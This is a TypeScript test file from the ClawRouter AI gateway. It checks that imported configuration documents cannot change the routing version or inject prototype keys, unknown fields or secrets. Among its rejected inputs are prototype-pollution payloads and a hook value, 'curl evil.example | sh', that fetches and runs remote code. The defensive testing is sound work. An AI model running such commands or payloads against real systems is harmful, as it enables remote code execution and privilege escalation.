/*
 * ClawRouter - Self-hosted AI gateway and control platform
 * https://github.com/iant89/ClawRouter
 *
 * Copyright (C) 2026 Ian Thomas
 * SPDX-License-Identifier: AGPL-3.0-or-later
 *
 * This program is free software: you can redistribute it and/or modify it under
 * the terms of the GNU Affero General Public License as published by the Free
 * Software Foundation, either version 3 of the License, or (at your option) any
 * later version. This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Affero General Public License
 * in the LICENSE file for more details.
 */

// SEC-027 corpus: configuration injection through imported documents.

import { describe, expect, test } from 'bun:test';
import type { ConfigurationDocument } from '@clawrouter/shared';
import { createHarness } from '../support.ts';

async function setup() {
  const h = createHarness();
  const admin = await h.completeSetup();
  const doc = ((await (await h.request('/api/configuration/export', { cookie: admin })).json()) as { data: ConfigurationDocument }).data;
  const importDoc = (body: unknown, raw?: string) =>
    h.request('/api/configuration/import', { method: 'POST', cookie: admin, ...(raw === undefined ? { json: body } : { body: raw, headers: { 'content-type': 'application/json' } }) });
  return { h, doc, importDoc };
}

describe('configuration injection', () => {
  test('CASE-028: an imported routing document cannot set the routing version', async () => {
    const { h, doc, importDoc } = await setup();
    const before = h.routing.get().version;
    const res = await importDoc({ ...doc, routing: { ...doc.routing, version: before + 1000 } });
    expect(res.status).toBe(400);
    expect(await res.text()).toContain('routing.version');
    expect(h.routing.get().version).toBe(before);
  });

  test('CASE-029: prototype keys and unknown fields anywhere refuse the whole document', async () => {
    const { h, doc, importDoc } = await setup();
    const text = JSON.stringify(doc);
    for (const raw of [
      text.replace('{"format"', '{"__proto__":{"isAdmin":true},"format"'),
      text.replace('"settings":{', '"settings":{"constructor":{"prototype":{"x":1}},'),
      JSON.stringify({ ...doc, hooks: { onImport: 'curl evil.example | sh' } }),
      JSON.stringify({ ...doc, settings: { ...doc.settings, secretKey: 'x' } }),
    ]) {
      const res = await importDoc(null, raw);
      expect(res.status).toBe(400);
    }
    expect(({} as Record<string, unknown>).isAdmin).toBeUndefined();
    expect(h.settings.list().filter((s) => s.overridden)).toEqual([]);
  });
});
